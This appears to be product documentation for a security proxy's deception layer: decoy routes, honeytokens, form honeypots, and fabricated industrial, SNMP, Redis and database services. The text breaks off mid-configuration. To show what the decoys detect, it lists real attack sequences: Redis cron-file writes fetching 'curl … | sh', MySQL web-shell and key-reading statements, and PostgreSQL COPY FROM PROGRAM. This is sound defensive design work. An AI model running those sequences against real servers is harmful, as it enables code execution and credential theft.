# Deception

Honeypot routes, decoys, honeytokens, form honeypots, WAF shape rules,
the slow lane, deceptive answers and refusal at the handshake — what
each one is for, what it costs an attacker, what it risks, and the
order to build them in.

Every other control in this proxy answers a question the attacker
asked. An allow list, a rate limit, a WAF rule and a ban all end in a
refusal, and a refusal is information: it says *that request was the
interesting one*, and the attacker varies it until something is not
refused. The refusal is the oracle. A scanner with an oracle and
patience finds the way through; a scanner with neither goes somewhere
cheaper.

Deception takes the oracle away and sends the bill back. A decoy costs
the attacker a page it must read and act on. A honeytoken costs it the
credential it went to the trouble of stealing. A slow lane costs it
time. A deceptive answer costs it the thing it came for: certainty
about what it found. None of them makes the estate harder to attack in
the classical sense. All of them make it more expensive, and — more
usefully — they produce a detection with no false-positive rate to
argue about, because nobody legitimate walks into a room that does not
exist.

## Contents

- [The one rule](#the-one-rule)
- [The family at a glance](#the-family-at-a-glance)
- [How the signals chain](#how-the-signals-chain)
- [Honeypot routes and decoys](#honeypot-routes-and-decoys)
- [Honeytokens](#honeytokens)
- [Form honeypots](#form-honeypots)
- [WAF rules that feed the same signals](#waf-rules-that-feed-the-same-signals)
- [The slow lane](#the-slow-lane)
- [Deceptive answers on real routes](#deceptive-answers-on-real-routes)
- [A device that is not there](#a-device-that-is-not-there)
- [A substation that is not there](#a-substation-that-is-not-there)
- [A controller that is not there](#a-controller-that-is-not-there)
- [An agent that is not there](#an-agent-that-is-not-there)
- [A cache that is not there](#a-cache-that-is-not-there)
- [A MySQL that is not there](#a-mysql-that-is-not-there)
- [A PostgreSQL that is not there](#a-postgresql-that-is-not-there)
- [A resolver that is not there](#a-resolver-that-is-not-there)
- [A login that is not there](#a-login-that-is-not-there)
- [Refusal at the TLS handshake](#refusal-at-the-tls-handshake)
- [What it produces](#what-it-produces)
- [Building it out](#building-it-out)
- [Failure modes](#failure-modes)
- [What deception is not](#what-deception-is-not)
- [A worked configuration](#a-worked-configuration)

## The one rule

**A deception must be somewhere no legitimate client goes, or it is not
a deception — it is an outage with a clever name.**

Everything below follows from that. A honeypot on `/admin` is a
detection; a honeypot on `/admin` in an estate whose real administration
lives at `/admin` is a support ticket. A hidden form field a password
manager fills in is not hidden. A degradation level with no condition
degrades everyone. A `deceive` block that admits too much quietly throws
away a customer's order.

Two consequences worth stating plainly:

- **The controls are not equal.** A honeytoken has no false-positive
  rate at all: nothing legitimate ever sends a planted value. A hidden
  field is nearly as clean. A bot score is a judgement. A CIDR is a
  guess about a range. Put the actions with consequences (discarding a
  write, refusing a handshake) behind the signals with no false
  positives, and put the gentle actions (slowing, logging) behind the
  judgements.
- **Start in the observing mode every one of them has.** `action: log`
  for a honeytoken, `mode: detect` for a WAF profile, `learn: true` for
  bot scoring, a degradation level with only `delay` before one with
  `close`. Promote what is quiet. Nothing here needs to be right on the
  first day, and the cost of being wrong is paid by a real user.

## The family at a glance

| Control | Where | What it costs the attacker | Risk if wrong | False positives |
|---------|-------|----------------------------|---------------|-----------------|
| Honeypot route + decoy | `routes[].honeypot` | A page it must fetch, read and act on; a mark that follows it | A path a real client uses answers a decoy | None, if the path is unused |
| Tarpit delay | `routes[].honeypot.delay` | Wall-clock time, held outside the request budget | Nothing (slots are bounded by `max_tarpits`) | None |
| Honeytoken | `honeytokens[]` | The credential it stole, plus the ban that follows | None, unless a real value was registered | **None** |
| Form honeypot | `form_guard` filter | Its form-filling run | A visible field, or too tight a clock | Field: none. Timing: real |
| WAF shape rules | `examples/waf/attack-surface-rules.conf` | The shapes it reaches for first | An application that genuinely sends one | Real; detect first |
| Slow lane | `degradation` | Time, and connection reuse | A slow site for a misjudged client | Real; gentle by design |
| Deceptive answer | `routes[].deceive` | Certainty — it cannot tell a find from a miss | **A real client silently loses data** | Must be none |
| Fabricated device | `modbus.deception`, `iec104.deception`, `s7.deception`, `snmp.deception` | A plant it must map, all of it wrong; the tripwire that fires while it does | A frame on its way to a real device answered by the fabrication -- which is what the one rule exists to prevent | None: it answers only where a refusal would be |
| Fabricated cache | `redis.deception` | The whole exploit chain, answered -- and its directory, file name and payload in your log | The same, plus a value read back that was never stored | None, as above |
| Fabricated database | `mysql.deception`, `postgres.deception` | The reconnaissance, answered consistently -- and which escalation it was for: a web shell, a key off the server, a file off the *client*, or, on PostgreSQL, a shell command the manual documents | The same, plus an empty result set where a real query needed rows | None, as above |
| Fabricated resolver | `dns.deception` | The refusal it was reading, and the rest of what was leaving: a tunnel told NXDOMAIN moves channel, one that is answered keeps sending | A fabricated answer aimed at a real host, if the pool names one; an amplifier, if the bound were not there | None: it answers only where a refusal would be |
| Fabricated login | `telnet.deception` | The dictionary it is walking, and then the payload: the address it fetches from, the architecture it built for | A real operator handed a fabricated device during an outage -- which is why it never replaces one | None: it answers only where a refusal would be |
| Handshake refusal | `handshake` | A key exchange it does not get to spend | A client refused with no log line to explain it | Only what the ban list holds |

## How the signals chain

Nothing here is a single control. The value is that one cheap,
unambiguous event — a client asked for `/wp-login.php` — propagates
into every later decision about that client:

```
  decoy fetched ─┐
  honeytoken  ──┼──▶  mark (routes[].honeypot.mark, honeytokens[].mark)
  form honeypot ┘             │
                              ├──▶ access log:  honeypot_marked: true
                              ├──▶ bot_score:   +40 (honeypot_marked signal)
                              ├──▶ degradation: levels with `marked: true`
                              ├──▶ deceive:     routes with `marked: true`
                              └──▶ bans:        triggers on reason
                                                honeypot / honeytoken
                                                      │
                                                      ▼
                                          handshake.refuse_banned:
                                          the next connection gets
                                          no handshake at all
```

Read downwards, that is the whole design: the cheapest signal at the
top, the most consequential action at the bottom, and a mark carrying
the judgement between them. A cluster shares marks and bans, so a
scanner that touches one node is known to all of them.

## Honeypot routes and decoys

A honeypot route answers a decoy and proxies nothing:

```yaml
routes:
  - name: hp-wp
    paths: [/wp-login.php, /xmlrpc.php]
    honeypot: {decoy: wp-login, mark: 1h, delay: 2s}
```

**Choosing paths.** The paths must be ones nothing legitimate asks for.
Three sources, in order of confidence: paths for software this estate
does not run (`/wp-login.php` on a Go application), paths for files that
should never be served (`/.env`, `/.git/config`, `/config/secrets.yml`),
and paths a real crawler would only learn from a decoy that names them.
Check the access log for 404s first — the paths already being probed are
the paths worth answering, and the log tells you which they are.

**The decoys.** The build carries 138 of them (`xproxyctl honeypot`
lists the names; [CONFIG.md](CONFIG.md#routeshoneypot) tables them with
a typical bait path each). They cover PHP and WordPress, leaked files,
secrets and build files, cloud metadata, platform consoles and
registries, application servers, appliances and gateways, notebooks and
model servers, databases, content management systems, framework debug
consoles, the files a traversal hands over, and the surfaces that come
with the estate's other protocols — webmail and mail administration,
broker dashboards and ACL files, bastion and remote-access consoles,
SSH and VPN material, and the session files an FTP or SFTP client
saves passwords in. Each looks like the real
thing down to a version string, and each contains nothing an operator
would mind being read: every credential, key and host name in them is
visibly fake, and a test refuses a decoy that hands out a password, a
token or a key without a marker saying so. `body` and `body_file` serve
your own instead.

**The mark is the product.** The decoy is bait; `mark` is the hook. A
marked client is logged as `honeypot_marked: true` on every later
request on every route, reaches filters as `Info.HoneypotMarked`, adds
40 to its bot score, and is what `degradation` and `deceive` mean by
`marked: true`. Durations worth copying: an hour for a noisy commodity
probe, six for infrastructure and consoles, a day for secrets, debug
consoles and appliance gateways — the client that finds those is not
spraying.

**`mark: 0s` is a real setting.** `robots` and `sitemap` are served
*honestly*: they name the decoy paths, and reading them is exactly what
a crawler is meant to do. Marking a client for reading `robots.txt`
would mark Googlebot. Give those two `mark: 0s`; asking for what they
name is the different route that does the marking.

**`delay` is a tarpit, not a sleep.** A held decoy releases its request
slot first and waits in a tarpit slot (`server.max_tarpits`), so
holding a scanner for five seconds never costs the concurrency the
proxy sells to everyone else. When no tarpit slot is free the answer is
served immediately and the `tarpit_overflow` counter in `xproxyctl
status` records it: the design
degrades by being less annoying, never by queueing real traffic.

**A browser fetching a decoy because another site told it to** — an
`<img>` in a forum post, a prefetch, a planted link — says nothing about
the person behind it. Those requests carry `Sec-Fetch-Site:
cross-site` or a prefetch purpose; the decoy is served, `honeypot_induced`
goes in the log, and nobody is marked or banned. A scanner sends no
`Sec-Fetch-Site` at all and is counted as usual.

`examples/security/honeypots.yaml` is the whole table wired up: one
route per decoy with the paths and the mark each is worth.

## Honeytokens

A decoy hands out an AWS key, a database password, a session cookie.
Until something watches for their *use*, none of that is a detection —
the scanner reads the file, and the proxy knows only that the file was
read. Registering the planted values closes the loop:

```yaml
honeytokens:
  - name: env-aws-key
    description: planted in the env and aws-credentials decoys
    values: ["AKIADECOY000000EXAMPLE"]
  - name: backup-session
    description: seeded in the 2026-01 customer database export
    values: ["s%3Adecoy.0000000000000000000000000000"]
    in: [cookies]
  - name: unlinked-export-url
    description: printed in the internal runbook only
    values: ["export-7f3a9c2b1d8e4056"]
    in: [path]
    match: contains
bans:
  triggers:
    - {name: honeytoken-use, reasons: [honeytoken], threshold: 1, window: 1m, duration: 24h}
```

This is the one control here with no false-positive rate whatsoever.
There is no score to tune and no detection rate to trade: a hit is an
attacker replaying what they read. **A threshold of one is the correct
threshold**, and a single hit is worth waking someone.

**Plant them beyond the decoys.** That is where the technique earns its
keep, because the token says *which copy leaked*: a key committed to a
public repository, a session seeded into a database export, an
identifier embedded in a document, a URL that appears only in the
runbook, a credential given to one supplier. When it comes back, you
know the path it took.

**Two rules.** Start a new plant with `action: log` until it is proven
quiet — a token that fires on real traffic was planted somewhere real
traffic reaches — and **never register a real credential**: the value is
compared as an ordinary string and the whole design assumes it is fake.

The check runs before routing (a stolen credential can be sent to any
path) and before the challenge (a scanner replaying one should not be
offered a browser challenge). The value itself is never logged: the
security event names the token, the field it arrived in and the
description, and nothing else. `xproxyctl honeypot` lists the plants
with their hits and last hit.

## Form honeypots

A form bot does two things a person does not: it fills in every field it
finds, including the one nobody can see, and it submits faster than
anyone could have read the page.

```yaml
filters:
  - name: signup-guard
    kind: form_guard
    options:
      fields: [contact_reason, website]   # must arrive empty or absent
      min_seconds: 2
      max_seconds: 3600
      form_paths: [/signup]
      reason: honeypot                    # so a ban trigger can see it
```

```html
<div style="position:absolute;left:-9999px" aria-hidden="true">
  <label>Leave this empty<input type="text" name="contact_reason"
         tabindex="-1" autocomplete="off"></label>
</div>
```

The field is the half with no false positives, so it is the half to
deploy first and alone. Keep it off screen rather than `display:none`
(some crawlers skip what is not rendered, and a stylesheet that fails to
load must not show a real person a field they will fill in), give it a
name worth filling in, and keep password managers out with
`tabindex="-1"` and `autocomplete="off"`.

Timing is the half with a real false-positive rate, and it needs the
care: set `min_seconds` to what the *shortest honest fill* takes, not
the average one. A password manager submits a login form in well under a
second. A client with no form fetch on record is allowed, because the
page can be cached, prerendered or served by another node — turn that
into a refusal with `require_fetch` only where all three are impossible.
Denies name which half fired (`field:<name>`, `too_fast`, `too_old`,
`no_form_fetch`) and add `form_seconds` to the access log, which is what
tells you where the floor belongs before you tighten it.

## WAF rules that feed the same signals

Four example rule files, in increasing bluntness:

| File | What it holds |
|------|---------------|
| `examples/waf/custom-rules.conf` | The handful every estate writes: a debug header, a virtual patch, an IP `Host`, a JSON content type on writes, a secret-path probe scored rather than refused |
| `examples/waf/hardening-rules.conf` | Themed payload rules: backup and source-control leftovers, template and JNDI expressions, class-loader binding, `..;/` path parameters, diagnostic methods, executable uploads, bounds on parameters, cookies and ranges, GraphQL introspection, keys and database errors on the way out |
| `examples/waf/attack-surface-rules.conf` | Shape rules: cloud metadata and non-web schemes, traversal targets and stream wrappers, serialised objects, external entities, query operators as field names, shell commands, SpEL and Shellshock, smuggling spellings, cache poisoning and cache deception, prototype pollution, header injection, debugger parameters, browser-executing uploads, scanner user agents, interpreter error pages and directory listings |
| `examples/waf/protocol-surface-rules.conf` | The web surfaces beside the other protocols: webmail and mail administration paths, mail header and SMTP command injection, broker dashboards and `$SYS` topics, wildcard subscriptions, SSH and VPN material and file transfer session files, remote access consoles, private keys in bodies, absolute URIs and MASQUE paths reaching a reverse proxy, protocol scanner agents, and a host with a service port in one form |

Three conventions make them work with everything above rather than
beside it:

- **Tag by theme** (`tag:'local/ssrf'`, `tag:'local/leak'`), so
  `xproxyctl waf rules` counts a whole class and a dashboard can chart
  it.
- **Score what is ambiguous, refuse what is not.** A template expression
  or an absolute redirect target adds to the anomaly score and lets the
  CRS threshold decide with everything else the request did; a shell
  function definition in a header does not need a second opinion.
- **A WAF deny feeds the ban triggers** under reason `waf`, which is
  what turns a repeated prober into a banned one, which is what
  `handshake.refuse_banned` acts on. The rule file is the top of the
  chain, not a separate system.

Load a new file into a `mode: detect` profile, read `xproxyctl waf
rules` for a week, promote what is quiet. Shape rules especially: an
application that legitimately fetches `file://` URLs, speaks a
Mongo-style query language or accepts SVG uploads will be refused by
one of them.

## The slow lane

```yaml
degradation:
  levels:
    - name: marked            # narrowest first: the first match wins
      marked: true
      bytes_per_second: 8192
      delay: 500ms
      close: true
    - name: likely-bot
      bot_score_at: 60
      routes: [catalogue, search]
      bytes_per_second: 65536
```

For a client that has done something wrong but not enough to ban, both
binary answers are wrong: serving it in full funds the next request,
and refusing it hands back the oracle. Degrading is the middle. The page
arrives — correctly, so there is nothing to report as broken and nothing
to tune against — at eight kilobytes a second, on a connection that
cannot be reused. A crawl that cost the scanner nothing now costs it
time, which is the one thing it has least of.

The delay is spent in a tarpit slot, like a honeypot's, never in a
request slot. Validation refuses a level that names no condition at all
under selectors that admit everything, because a degradation everyone
gets is just a slow site. Watch `xproxy_degraded_total{level}` after
enabling one: a level applying to a meaningful share of traffic is a
level admitting people.

## Deceptive answers on real routes

The strongest form, and the one to be most careful with:

```yaml
routes:
  - name: api
    paths: [/api]
    upstream: app
    deceive:
      marked: true          # a honeypot or honeytoken marked it
      bot_score_at: 80
      status: 200
      body: '{"items":[],"total":0}'
      content_type: application/json
      mark: 1h              # keep it on the same answer
```

A scanner that gets 403 has learned something. A scanner that gets an
empty, ordinary, correct-looking answer has learned nothing, cannot tell
a find from a miss, and has no gradient to climb. The origin is never
asked, so the data is not merely hidden — it was never read.

**The origin is never asked for writes either, so a deceived `POST` is
discarded.** That is the point of it, and it is why the conditions
matter more here than anywhere else in this document: a false positive
means a real client silently loses data. Put `deceive` behind `marked`
(no false positives) rather than a bot score (a judgement), keep
`bot_score_at` high if you use it at all, and read
`xproxy_deceived_total{route}` before trusting it. Validation refuses a
block that names no condition and warns on every route that carries one.

## A device that is not there

Everything above is HTTP. The relay kinds had the opposite posture --
forward or refuse -- and refusing is how a scan of an operational estate
turns into a survey. A probe of a Modbus relay routing unit 1:

```
unit 1 read  -> 2 registers [4660 0]
unit 2 read  -> exception 0x0a
unit 3 read  -> exception 0x0a
unit 17 read -> exception 0x0a
```

`0x0a` is "gateway path unavailable", which is the honest answer for a
unit identifier nothing is behind, and the relay was right to send it.
Sweep 1 to 247 and the answers draw the map: which unit identifiers
exist, and — since a refused function code answers `0x01` while a
permitted one answers data — which functions the policy allows. The scan
is refused and the survey completes.

`modbus.deception` answers instead:

```yaml
# A honeypot: an address on the plant network with nothing behind it.
- name: cell-4-spare
  address: "10.20.0.41:502"
  kind: modbus
  modbus:
    default_action: allow
    deception:
      mode: decoy
      profile: generic-plc
      vendor: "…the make this plant actually runs…"
      units: ["1-4"]
      tripwire: ["9000-9099"]

# A real relay, where only these clients are lied to, and only about
# frames it was going to refuse anyway.
- name: line1
  address: "10.20.0.10:502"
  kind: modbus
  modbus:
    upstream: plc
    read_only: true
    deception:
      mode: answer
      clients: ["10.90.0.0/24"]
      units: ["1-32"]
```

**The one rule, in the form a plant needs it.** On a web gateway the
worst case of a deceptive answer is a client receiving nonsense. Here it
is an operator reading a fabricated tank level off an HMI and acting on
it. So: *a frame that was going to reach a device is never answered by
the fabrication*. Deception replaces a refusal -- a policy denial, or a
unit identifier nothing is behind -- and never an answer. That is a test,
not an intention, and `mode: answer` will not load without `clients`.

**A fabricated device has to be answerable.** Three things give a decoy
away, and each is a property the values here hold to:

- **Noise.** A register that reads differently twice in a row is not a
  process. Values are stable for a period (30s by default) and derived
  from the address, so two reads a moment apart agree.
- **Stillness.** A register that never moves is a device nothing drives.
  A period later the value has drifted, by a little.
- **Impossibility.** A totaliser that goes backwards, a device on all
  247 unit identifiers, a PLC that implements every function code in the
  standard. Counters are monotone by construction, `units` defaults to
  one, and a function code the profile does not list answers `0x01` --
  which is what the real device would say.

None of it is stored: a value is a function of the seed, the address and
which period of the clock it is, so a sweep of all 65536 addresses costs
the relay no memory. The seed defaults to the listener name, so the
fabricated device is the same device after a restart -- a decoy whose
serial number changes when the proxy is upgraded is a decoy somebody has
noticed.

**The identity is yours to choose.** Function code 17 and 43/14 are what
a scanner fingerprints on, and the built-in profiles say something
deliberately generic. A decoy should claim the make the plant actually
runs, because a Schneider identity on a Rockwell site is the tell that
ends the pretence, and only you know which it is.

**The tripwire is the signal.** Addresses no legitimate master reads are
answered -- the answer keeps the visitor reading -- and raised as
`modbus_tripwire`. That event has no false-positive rate to argue about,
which puts it in the same class as a honeytoken: nothing legitimate walks
into a room that does not exist. `xproxyctl honeypot` lists the visitors
with what each one touched.

## A substation that is not there

Modbus gives away its estate one unit identifier at a time. IEC 104 gives
away a whole grid one common address at a time, and it is a shorter walk:
the common address is two octets, a control centre names it in every ASDU,
and a relay that refuses the ones it does not carry has answered the
question.

```
common address 1  -> interrogation answered, 64 points
common address 2  -> negative confirmation
common address 3  -> negative confirmation
common address 41 -> interrogation answered, 12 points
```

Two answers in a sweep of 65535 is the substation list, and the
interrogation that follows each one is the point list: which breakers,
which measurements, which totalisers. The scan was refused throughout.

`iec104.deception` answers instead:

```yaml
# A honeypot: a control centre's own address range, with no station
# behind it at all.
- name: substation-spare
  address: "10.30.0.41:2404"
  kind: iec104
  iec104:
    deception:
      mode: decoy
      profile: generic-substation
      common_addresses: ["1-4"]
      tripwire: ["9000-9099"]

# A real relay, where only these clients are lied to, and only about
# activations it was going to refuse anyway.
- name: grid-north
  address: "10.30.0.10:2404"
  kind: iec104
  iec104:
    upstream: substation
    monitor_only: true
    deception:
      mode: answer
      clients: ["10.90.0.0/24"]
```

**The one rule again, and it bites harder here.** A fabricated tank level
is one operator reading one number. A fabricated *breaker confirmation* is
a control room that believes a circuit is open when it is closed, which is
how a linesman gets hurt. So the same test holds, and it is the reason
`mode: answer` never touches a frame the policy allowed: deception
replaces the negative confirmation a refusal would have sent, and nothing
else. `mode: answer` will not load without `clients`, and a decoy listener
will not load with an upstream.

**What makes a fabricated station answerable.** A control centre's own
software checks the protocol harder than any Modbus master does, so the
decoy speaks the association the way the standard describes it:

- Nothing at all before STARTDT_act, a confirmation for it, and then
  M_EI_NA_1 -- the end of initialisation, which is how a centre knows a
  station has restarted. A station that has apparently been running since
  before the centre was born is a station somebody looks at twice.
- A general interrogation answered with ACTCON, then the points at cause
  20, then ACTTERM. A counter interrogation answered the same way with
  the totalisers, which only go up.
- A common address the fabrication is not, answered the way a station
  answers one: negatively, with cause 47. One association carrying twenty
  substations is not a substation.
- Values stable for a period, drifting by a little between periods, and
  derived from the information object address, so two interrogations a
  moment apart agree and a month of them never repeats exactly.
- Spontaneous reports between interrogations, because a station that
  says nothing until spoken to is not a station.

**The tripwire is the signal**, as it is everywhere else here: information
object addresses no legitimate centre reads are answered -- the answer is
what keeps the visitor reading -- and raised as `iec104_tripwire`.
`xproxyctl honeypot` lists who arrived and what they touched.

## A controller that is not there

The third of these, and the one where the disclosure is hardest to avoid by
policy alone. `s7` fronts a Siemens PLC, and the first thing any scanner asks
for is the system status list: the order number, the module type, the firmware
version. Refuse it and the scanner has learned there is a relay in front of
something; forward it and it has the controller. The asset tools an estate runs
itself read the same list, so making it less informative breaks them too.

```
DB1  read    -> 4 octets
DB2  read    -> access fault
DB3  read    -> access fault
SZL 0x0011   -> 6ES7 315-2EH14-0AB0, firmware 3.2.7
SZL 0x001c   -> CPU 315-2 PN/DP, plant CELL4
```

`s7.deception` answers as a controller instead:

```yaml
# A honeypot: an address on the cell network with no CPU behind it.
- name: cell-9-spare
  address: "10.20.9.41:102"
  kind: s7
  s7:
    deception:
      mode: decoy
      profile: generic-s7-300
      order_number: "…the make this plant actually runs…"
      blocks: [{dbs: "1-8", bytes: 512}]
      tripwire: ["666"]

# A real relay, where only these clients are answered, and only about
# requests it was going to refuse anyway.
- name: line1
  address: "10.20.0.10:102"
  kind: s7
  s7:
    upstream: plc
    read_only: true
    deception:
      mode: answer
      clients: ["10.90.0.0/24"]
```

**The same rule, and the same reason.** A request that was going to reach the
controller is never answered by the fabrication: deception replaces a refusal
and never an answer. Beyond that, only a read, a write and the identification
lists are fabricated at all — every other refused function keeps the access
fault a protected CPU sends, because a fabrication that acknowledged a stop or a
download would be telling a client a machine had stopped or a block had landed.

**What makes a fabricated CPU answerable.** The identity is most of it, and the
profiles are deliberately ordinary — a plant should set the make it actually
runs, since a 315 on a site that is all 416s is the tell that ends the
pretence. The rest is what a controller *cannot* do:

- It does not have every data block. A read of one it does not claim is
  answered "object does not exist", and a read past the end of one it does
  claim gets an address error.
- It does not offer the direct peripheral area or the 200-family areas.
  Claiming direct access to I/O hardware would be claiming hardware.
- It does not speak S7comm-plus. That is the 1200 and 1500 families, whose
  sessions are integrity-protected; a decoy claiming to be a 300 answers such a
  request with a COTP disconnect, which is what a 300 does.
- It negotiates a PDU length its family negotiates: 240 for a 300, 480 for a
  400. A number no controller sends is one a client library prints.

`tripwire` names the data blocks nothing legitimate reads — DB666 is the
traditional choice — answered, and raised as `s7_tripwire`.

## An agent that is not there

The three above are plant protocols. This one runs the switches, the routers,
the printers and the UPSs on the same network, and it is the most scanned
management protocol there is — so it is where a fabrication earns the most,
and where it has to be built most carefully.

Two things make it different. The refusal is about a **credential**: a
community string that is wrong is refused and one that is right is answered,
so the refusal is the oracle a password list needs. And the system group is
the estate's own inventory, read first by every scanner and by the monitoring
the estate runs itself, so no policy can make that answer less informative
without breaking both.

```
community "public"    -> noSuchName
community "s3cret"    -> 24-port managed Ethernet switch
a walk of 1.3.6.1.2.1 -> every port, every counter
```

`snmp.deception` answers instead:

```yaml
# A honeypot: an address on the management network with nothing on it.
- name: sw-spare
  address: "10.50.0.41:161"
  kind: snmp
  snmp:
    deception:
      mode: decoy
      profile: generic-switch
      sys_descr: "…what the estate's own switches say…"
      sys_name: "sw-cell9"
      interfaces: 24
      tripwire: ["1.3.6.1.4.1.9.9.96"]
    # The bounds below are not optional on a datagram protocol.
    max_repetitions: 25
    max_var_binds: 64
    max_response_bytes: 4096
```

**The rule is the same one**: a request that was going to reach the agent is
never answered by the fabrication. **The bound is the one this protocol adds.**
A fabricated agent is a UDP service that answers a small request with a larger
response, which is precisely what a reflection amplifier is: a GETBULK of
forty octets asking for a thousand repetitions is half a megabyte sent
wherever the source address claimed to be. So the listener's own
`max_repetitions`, `max_var_binds` and `max_response_bytes` bound the
fabrication exactly as they bound an agent's answer, and an answer that would
exceed the last of them is replaced with `tooBig` — what an agent sends, and
what a manager retries in smaller pieces. A honeypot that is also an amplifier
is a liability, not a sensor.

**What makes a fabricated agent answerable** is mostly that it can be walked.
Every answer is strictly after the name asked about and the table ends rather
than looping, which is the first thing any manager notices. Beyond that it is
the things a device cannot do: it does not have every object (a name outside
its table is `noSuchObject`, or `noSuchName` with an index for a version 1
manager), it does not answer version 3 (the response would need a digest this
relay cannot compute, and an unauthenticated answer to an authenticated
protocol is a worse tell than silence), and it does not answer a notification.
A `SetRequest` is answered as though it landed, and nothing is written — the
same choice the Modbus section makes about a refused write.

## A cache that is not there

The four above run plant and network equipment, where the visitor is usually a
person with a laptop or a scanner mapping an estate. This one is different: the
attacker on Redis is a **script**, and it is always the same script.

An exposed instance with no password is found by a scanner, and what arrives next
is a fixed sequence. It has been the same sequence for a decade:

```
INFO                              what is this, and what version
CONFIG GET dir                    where does it write
CONFIG GET dbfilename             what does it write
CONFIG SET dir /var/spool/cron    point that somewhere that executes
CONFIG SET dbfilename root
SET x "\n* * * * * curl … | sh\n"  the payload, as an ordinary value
SAVE                              write the file
```

That is remote code execution built entirely out of commands the protocol
considers ordinary. There is no exploit in it and nothing to patch: `CONFIG SET`
plus `SAVE` is a documented way to write a file wherever the server can write, and
`dir` plus `dbfilename` is the path.

A refusal stops the script at the first step. It also tells its author that
something is in the way, and the next address on their list is thirty seconds
away. What it does not tell you is which directory they were aiming at, or what
they meant to run.

`redis.deception` answers instead:

```yaml
# A honeypot: a cache on the application network with nothing behind it.
- name: cache-spare
  address: "10.60.0.41:6379"
  kind: redis
  redis:
    require_tls: false     # an unprotected instance is what the scanning wants
    deception:
      mode: decoy
      profile: session-store
      version: "7.0.15"    # …what the estate's own caches say…
      key_count: 256
```

**The rule is the same one**: a command that was going to reach the server is
never answered by the fabrication. On a real listener (`mode: answer`) it sits
exactly where a refusal would be written, so the exploit chain gets its `+OK` and
the application's own traffic still goes to the real Redis.

**The tripwires need no configuring**, which is the one place this protocol
differs from the four above. On a PLC an operator has to say which registers
nobody legitimate reads, because only they know. Here the answer is universal:
nothing legitimate sends `CONFIG SET`, `MODULE LOAD`, `REPLICAOF`, `EVAL`,
`SHUTDOWN`, `FLUSHALL` or `SAVE` to a fabricated cache. All of them raise
`redis_tripwire` from the start, and `tripwire` adds to that list rather than
replacing it.

**What makes a fabricated cache answerable** is mostly that its keyspace holds
together. `DBSIZE`, `KEYS`, `SCAN` and `INFO`'s keyspace section count the same
keys; `SCAN` walks all of them and terminates; `TYPE` and the command that follows
it agree; a key read twice inside one period reads the same both times; and
`total_commands_processed` and `uptime_in_seconds` only ever rise, because a
counter that went backwards between two `INFO`s is the tell that ends the
pretence. An unknown command answers Redis's own wording, echo of arguments
included, because a scanner that sends a nonsense command and reads something
else has found the decoy.

**Two things it will not pretend.** `EVAL` and `MODULE LOAD` answer the error the
real server answers when it cannot: a `+OK` to either would be a claim that code
was running, and nothing said afterwards would be consistent with it. This is the
same line the Modbus section draws about a refused write — the fabrication answers
as though the command landed, and it does not invent a consequence it cannot
maintain.

**And a password is never recorded.** `AUTH`'s arguments become the user name and
the password's *length* in the event, for the reason the SNMP section gives about
community strings: a log holding every credential sprayed at the estate is a list
of the estate's own credentials as often as not. Everything else *is* recorded,
one line and clipped, because on this protocol the arguments are the message —
the directory, the file name, the replication target, the cron entry.

## A MySQL that is not there

The cache above is attacked by a script. A database is attacked by somebody
reading the answers — and on MySQL the reading is done with statements that are,
one at a time, completely ordinary.

A scanner finds 3306, reads the greeting for a version, and then asks:

```
SHOW DATABASES                  what is here
SELECT @@datadir                where does it keep its files
SELECT @@secure_file_priv       may a statement write one
SHOW GRANTS                     does this account have FILE
SELECT * FROM mysql.user        the password hashes
```

Nothing in that list is an exploit. Every one of them is a statement a monitoring
dashboard might send. What they are *for* is deciding which of four things the next
statement will be:

```
SELECT '<?php …' INTO OUTFILE '/var/www/html/s.php'   a web shell
SELECT LOAD_FILE('/home/app/.ssh/id_ed25519')         a key off the server
LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE t     a file off the *client*
CREATE FUNCTION sys_exec RETURNS int SONAME 'udf.so'  a shared object
```

A refusal at the greeting ends the conversation before any of that, and tells you
that somebody connected. Answering it tells you which of the four they had in mind.

`mysql.deception` answers instead:

```yaml
# A honeypot: a database on the application network with nothing behind it.
- name: db-spare
  address: "10.70.0.41:3306"
  kind: mysql
  mysql:
    require_tls: false     # the fabricated greeting does not offer CLIENT_SSL
    deception:
      mode: decoy
      profile: wordpress
      version: "5.7.44-0ubuntu0.20.04.1"   # …what the estate's own servers say…
      tables: ["wordpress.wp_users", "wordpress.wp_options"]
```

**The rule is the same one**: a statement that was going to reach the server is
never answered by the fabrication. On a real listener (`mode: answer`) it sits
exactly where a refusal would be written.

**The answers have to agree with each other**, which is the part that takes care
on this protocol. `@@secure_file_priv` is NULL, so the file-writing statements get
error 1290 — the refusal a server with it set gives — and `LOAD_FILE` answers NULL
rather than an error, because that is what such a server does. `SHOW GRANTS`
reports an account without `FILE`, so a read of `mysql.user` answers 1142 rather
than an empty set: an empty set would say the table is there and has no rows,
which `mysql.user` never is. The MariaDB profile does not offer
`caching_sha2_password`, which MariaDB has never shipped. Each of those is a
consistency a fingerprinting tool checks, and each one wrong is the tell that ends
the pretence.

**Three things it will not do**, and all three are about the fabrication not
becoming a weapon or a resource.

It never asks the client for a file. `LOAD DATA LOCAL INFILE` is answered with an
error, not with the request packet the protocol allows — a fabrication that sent
that request would be attacking whoever connected to it, and the clients that
connect to a honeypot include the estate's own scanners.

It does not sleep. `SELECT SLEEP(60)` answers zero immediately, because honouring
it would make the decoy a way to hold this listener's resources, a statement at a
time, for as long as the visitor liked.

It does not invent rows. A `SELECT` the recognisers do not know returns an empty
result set, because the fabrication is a surface rather than a database and
inventing rows for an arbitrary projection would mean inventing a schema to match
— the same line the Modbus section draws about not inventing a consequence it
cannot maintain.

**And the password is never recorded.** The login's user name, plugin and program
name are kept, because they are identities; the authentication response is not,
for the reason the SNMP section gives about community strings.

## A PostgreSQL that is not there

The MySQL above is the commoner find. This one is the more dangerous, because
PostgreSQL can run a shell command *by design* and the statement that does it is
in the manual.

The reconnaissance is shorter here, and it turns on one question:

```
SELECT version()                          what is this
SELECT current_setting('data_directory')  where does it keep its files
SELECT usesuper FROM pg_user WHERE …      is this role a superuser
SELECT datname FROM pg_database           what is here
```

The third answer decides what the fourth is for:

```
COPY t FROM PROGRAM 'curl http://…|sh'    a shell command, documented
COPY t TO '/var/www/html/s.php'           a web shell
SELECT pg_read_file('/etc/passwd')        a file off the server
CREATE FUNCTION … LANGUAGE c              a shared object
SELECT usename, passwd FROM pg_shadow     the password hashes
```

A role that is not a superuser can do none of it. So the most consequential line
in this section is one boolean:

```yaml
# A honeypot: a database on the application network with nothing behind it.
- name: pg-spare
  address: "10.70.0.42:5432"
  kind: postgres
  postgres:
    require_tls: false
    deception:
